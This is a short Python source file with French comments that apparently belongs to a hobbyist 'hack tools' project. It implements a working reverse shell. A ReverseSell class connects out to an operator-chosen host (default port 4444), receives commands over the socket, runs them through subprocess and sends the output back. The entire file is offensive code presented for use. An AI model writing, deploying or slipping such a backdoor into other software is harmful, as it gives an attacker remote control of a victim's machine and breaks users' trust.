#Auteurs --> aiglematth
#        --> Guilhem

"""
Fichier contenant les outils de hack !
"""

#Imports
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import run, TimeoutExpired, PIPE
from shlex import split

#Classes
class Exe():
    """
    Classe qui servira à exe et récupérer les résultats des commandes
    """
    def __init__(self, timeout):
        """
        Constructeur de la classe
        :param timeout: temps maximal pour l'execution d'une commande
        """
        #Attributs
        self.timeout = timeout

    def exe(self, commande):
        """
        Méthode qui exe et retourne un résultat 'brut'
        :param commande: la commande à exe
        :return: un objet byte ou tuple
        """
        try:
            result = run(split(commande), timeout=self.timeout, stderr=PIPE, stdout=PIPE)
            return (result.stdout, result.stderr)
        except TimeoutExpired:
            return  b"TE"
        except:
            return b"FC"

    def propreExe(self, commande):
        """
        Méthode qui exe et retourne un résultat 'propre'
        :param commande: la commande à exe
        :return: un objet byte
        """
        result = self.exe(commande)
        if result == (b"FC" or b"TE"):
            return b"Il y a eu une erreur..."
        else:
            if result[0] != b"":
                return result[0]
            elif result[1] != b"":
                return result[1]
            else:
                return b"Commande exe, sans retour..."

class ReverseSell():
    """
    Classe du reverse shell
    """
    def __init__(self, host, port=4444, timeout=10):
        """
        Constructeur de la classe
        :param host: L'ip / DNS de la personne à qui se connecter (vous)
        :param port: Le port sur lequel se connecter
        :param timeout: Le timeout maximal pour l'exe d'une commande
        """
        self.host = host
        self.port = port
        self.exe = Exe(timeout=timeout)
        #Reverse shell
        self.reverseShell()

    def reverseShell(self):
        """
        Le code du reverse
        :return: None
        """
        with socket(AF_INET, SOCK_STREAM) as s:
            try:
                s.connect((self.host, self.port))
                self.shell(s)
            except:
                return None

    def shell(self, connexion):
        """
        La fonction qui gère l'envoi / réception / exe des commandes
        :param connexion: Un objet socket connecté
        :return: None
        """
        while True:
            commande = connexion.recv(1024).decode()
            if commande.upper() == "EXIT":
                break
            else:
                result = self.exe.propreExe(commande)
                connexion.send(result)



